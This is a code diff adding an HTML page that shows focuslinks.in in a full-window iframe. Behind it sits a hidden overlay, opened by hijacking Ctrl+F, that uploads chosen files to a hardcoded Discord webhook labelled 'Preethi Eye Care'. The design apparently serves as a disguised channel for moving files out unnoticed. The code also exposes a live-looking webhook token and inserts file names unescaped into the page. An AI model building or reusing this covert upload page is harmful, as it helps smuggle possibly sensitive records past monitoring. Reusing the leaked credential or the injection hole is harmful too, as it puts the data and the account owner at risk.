@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Focus Links</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body, html {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        .main-frame {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        .secret-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px);
+        }
+
+        .secret-overlay.active {
+            display: flex;
+        }
+
+        .upload-container {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            max-width: 500px;
+            width: 90%;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .upload-title {
+            color: #fff;
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 24px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .drop-zone {
+            border: 2px dashed #5865F2;
+            border-radius: 15px;
+            padding: 40px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background: rgba(88, 101, 242, 0.1);
+        }
+
+        .drop-zone:hover, .drop-zone.dragover {
+            background: rgba(88, 101, 242, 0.2);
+            border-color: #7289da;
+            transform: scale(1.02);
+        }
+
+        .drop-zone-text {
+            color: #a0a0a0;
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 16px;
+        }
+
+        .drop-zone-icon {
+            font-size: 50px;
+            margin-bottom: 15px;
+        }
+
+        .file-input {
+            display: none;
+        }
+
+        .file-list {
+            margin-top: 20px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .file-item {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 12px 15px;
+            border-radius: 8px;
+            margin-bottom: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: #fff;
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 14px;
+        }
+
+        .file-item-name {
+            flex: 1;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            margin-right: 10px;
+        }
+
+        .file-item-size {
+            color: #888;
+            font-size: 12px;
+            margin-right: 10px;
+        }
+
+        .file-item-remove {
+            background: #ff4757;
+            border: none;
+            color: #fff;
+            width: 25px;
+            height: 25px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .send-btn {
+            width: 100%;
+            padding: 15px;
+            margin-top: 20px;
+            background: linear-gradient(135deg, #5865F2 0%, #7289da 100%);
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .send-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(88, 101, 242, 0.4);
+        }
+
+        .send-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 20px;
+            right: 30px;
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 40px;
+            cursor: pointer;
+            opacity: 0.7;
+            transition: opacity 0.3s;
+        }
+
+        .close-btn:hover {
+            opacity: 1;
+        }
+
+        .status-msg {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 8px;
+            text-align: center;
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 14px;
+            display: none;
+        }
+
+        .status-msg.success {
+            display: block;
+            background: rgba(46, 204, 113, 0.2);
+            color: #2ecc71;
+        }
+
+        .status-msg.error {
+            display: block;
+            background: rgba(231, 76, 60, 0.2);
+            color: #e74c3c;
+        }
+
+        .status-msg.sending {
+            display: block;
+            background: rgba(88, 101, 242, 0.2);
+            color: #5865F2;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 2px;
+            margin-top: 10px;
+            overflow: hidden;
+            display: none;
+        }
+
+        .progress-bar.active {
+            display: block;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #5865F2, #7289da);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 3px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #5865F2;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body>
+    <iframe src="https://focuslinks.in" class="main-frame" id="mainFrame"></iframe>
+
+    <div class="secret-overlay" id="secretOverlay">
+        <button class="close-btn" id="closeBtn">&times;</button>
+        <div class="upload-container">
+            <h2 class="upload-title">📎 Secure File Transfer</h2>
+            
+            <div class="drop-zone" id="dropZone">
+                <div class="drop-zone-icon">📁</div>
+                <p class="drop-zone-text">Drop files here or click to browse<br><small>PDF, Images, Documents & more</small></p>
+                <input type="file" class="file-input" id="fileInput" multiple accept="*/*">
+            </div>
+
+            <div class="file-list" id="fileList"></div>
+
+            <div class="progress-bar" id="progressBar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+
+            <div class="status-msg" id="statusMsg"></div>
+
+            <button class="send-btn" id="sendBtn" disabled>Send Files</button>
+        </div>
+    </div>
+
+    <script>
+        const overlay = document.getElementById('secretOverlay');
+        const closeBtn = document.getElementById('closeBtn');
+        const dropZone = document.getElementById('dropZone');
+        const fileInput = document.getElementById('fileInput');
+        const fileList = document.getElementById('fileList');
+        const sendBtn = document.getElementById('sendBtn');
+        const statusMsg = document.getElementById('statusMsg');
+        const progressBar = document.getElementById('progressBar');
+        const progressFill = document.getElementById('progressFill');
+
+        const webhookUrl = 'https://discord.com/api/webhooks/1452092403614879935/xDZ57B7-3Th0xu97qpkFAXpw2XNMd59aNBoeLBJbvzrEg2VI2J8UugEVv9Fgc5YKAfS7';
+        let selectedFiles = [];
+
+        // Intercept Ctrl+F
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.key === 'f') {
+                e.preventDefault();
+                e.stopPropagation();
+                overlay.classList.add('active');
+            }
+            if (e.key === 'Escape') {
+                overlay.classList.remove('active');
+            }
+        });
+
+        closeBtn.addEventListener('click', () => {
+            overlay.classList.remove('active');
+            resetForm();
+        });
+
+        overlay.addEventListener('click', (e) => {
+            if (e.target === overlay) {
+                overlay.classList.remove('active');
+                resetForm();
+            }
+        });
+
+        dropZone.addEventListener('click', () => fileInput.click());
+
+        dropZone.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            dropZone.classList.add('dragover');
+        });
+
+        dropZone.addEventListener('dragleave', () => {
+            dropZone.classList.remove('dragover');
+        });
+
+        dropZone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            dropZone.classList.remove('dragover');
+            handleFiles(e.dataTransfer.files);
+        });
+
+        fileInput.addEventListener('change', (e) => {
+            handleFiles(e.target.files);
+        });
+
+        function handleFiles(files) {
+            for (let file of files) {
+                if (!selectedFiles.some(f => f.name === file.name && f.size === file.size)) {
+                    selectedFiles.push(file);
+                }
+            }
+            renderFileList();
+            sendBtn.disabled = selectedFiles.length === 0;
+        }
+
+        function renderFileList() {
+            fileList.innerHTML = '';
+            selectedFiles.forEach((file, index) => {
+                const item = document.createElement('div');
+                item.className = 'file-item';
+                item.innerHTML = `
+                    <span class="file-item-name">${file.name}</span>
+                    <span class="file-item-size">${formatSize(file.size)}</span>
+                    <button class="file-item-remove" onclick="removeFile(${index})">×</button>
+                `;
+                fileList.appendChild(item);
+            });
+        }
+
+        function removeFile(index) {
+            selectedFiles.splice(index, 1);
+            renderFileList();
+            sendBtn.disabled = selectedFiles.length === 0;
+        }
+
+        function formatSize(bytes) {
+            if (bytes === 0) return '0 B';
+            const k = 1024;
+            const sizes = ['B', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+
+        function getFileType(filename) {
+            const ext = filename.split('.').pop().toLowerCase();
+            const types = {
+                'pdf': '📄 PDF Document',
+                'doc': '📝 Word Document',
+                'docx': '📝 Word Document',
+                'xls': '📊 Excel Spreadsheet',
+                'xlsx': '📊 Excel Spreadsheet',
+                'ppt': '📽️ PowerPoint',
+                'pptx': '📽️ PowerPoint',
+                'txt': '📃 Text File',
+                'jpg': '🖼️ Image',
+                'jpeg': '🖼️ Image',
+                'png': '🖼️ Image',
+                'gif': '🖼️ Image',
+                'zip': '📦 Archive',
+                'rar': '📦 Archive'
+            };
+            return types[ext] || '📎 File';
+        }
+
+        sendBtn.addEventListener('click', sendFiles);
+
+        async function sendFiles() {
+            if (selectedFiles.length === 0) return;
+
+            sendBtn.disabled = true;
+            statusMsg.className = 'status-msg sending';
+            statusMsg.textContent = '⏳ Uploading files...';
+            progressBar.classList.add('active');
+
+            const now = new Date();
+            const timestamp = now.toLocaleString('en-IN', { 
+                timeZone: 'Asia/Kolkata',
+                dateStyle: 'full',
+                timeStyle: 'long'
+            });
+
+            let fileInfoText = selectedFiles.map(f => 
+                `• ${getFileType(f.name)} - **${f.name}** (${formatSize(f.size)})`
+            ).join('\n');
+
+            const embedPayload = {
+                embeds: [{
+                    title: "📥 New File Upload - Preethi Eye Care",
+                    description: `**Files Received:**\n${fileInfoText}`,
+                    color: 5865076,
+                    fields: [
+                        {
+                            name: "📅 Timestamp",
+                            value: timestamp,
+                            inline: false
+                        },
+                        {
+                            name: "📁 Total Files",
+                            value: `${selectedFiles.length} file(s)`,
+                            inline: true
+                        },
+                        {
+                            name: "💾 Total Size",
+                            value: formatSize(selectedFiles.reduce((a, b) => a + b.size, 0)),
+                            inline: true
+                        }
+                    ],
+                    footer: {
+                        text: "Preethi Eye Care • Secure Transfer"
+                    },
+                    timestamp: now.toISOString()
+                }]
+            };
+
+            try {
+                // Send embed first
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(embedPayload)
+                });
+
+                progressFill.style.width = '30%';
+
+                // Send files (Discord webhook allows up to 8MB per file, 10 files max)
+                const chunkSize = 10;
+                for (let i = 0; i < selectedFiles.length; i += chunkSize) {
+                    const chunk = selectedFiles.slice(i, i + chunkSize);
+                    const formData = new FormData();
+                    
+                    chunk.forEach((file, idx) => {
+                        formData.append(`file${idx}`, file, file.name);
+                    });
+
+                    formData.append('payload_json', JSON.stringify({
+                        content: `📎 **File Batch ${Math.floor(i/chunkSize) + 1}** - Preethi Eye Care`
+                    }));
+
+                    await fetch(webhookUrl, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    progressFill.style.width = `${30 + (70 * (i + chunk.length) / selectedFiles.length)}%`;
+                }
+
+                statusMsg.className = 'status-msg success';
+                statusMsg.textContent = '✅ Files sent successfully!';
+                
+                setTimeout(() => {
+                    resetForm();
+                    overlay.classList.remove('active');
+                }, 2000);
+
+            } catch (error) {
+                statusMsg.className = 'status-msg error';
+                statusMsg.textContent = '❌ Failed to send files. Please try again.';
+                sendBtn.disabled = false;
+                console.error(error);
+            }
+        }
+
+        function resetForm() {
+            selectedFiles = [];
+            fileList.innerHTML = '';
+            fileInput.value = '';
+            sendBtn.disabled = true;
+            statusMsg.className = 'status-msg';
+            statusMsg.textContent = '';
+            progressBar.classList.remove('active');
+            progressFill.style.width = '0%';
+        }
+    </script>
+</body>
+</html>
